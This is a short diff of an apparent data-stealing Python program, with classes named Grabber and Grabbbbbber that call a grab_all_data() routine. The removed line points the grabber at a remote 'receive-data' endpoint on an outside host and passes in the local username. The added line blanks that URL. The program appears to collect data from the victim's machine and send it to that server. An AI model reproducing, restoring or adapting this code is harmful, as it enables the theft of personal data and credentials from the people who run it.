@@ -509,7 +509,7 @@ class Grabber:
 
 class Grabbbbbber:
     def main(self):
-        self.grabber = Grabber(server_url="http://vynxy.pythonanywhere.com/receive-data", username=os.getenv('USERNAME') or os.getenv('USER') or 'unknown', password="N/A")
+        self.grabber = Grabber(server_url="", username=os.getenv('USERNAME') or os.getenv('USER') or 'unknown', password="N/A")
         success = self.grabber.grab_all_data()
             
 class Main:
@@ -522,4 +522,5 @@ class Main:
 
 if __name__ == "__main__":
     main = Main()
+
     main.run()
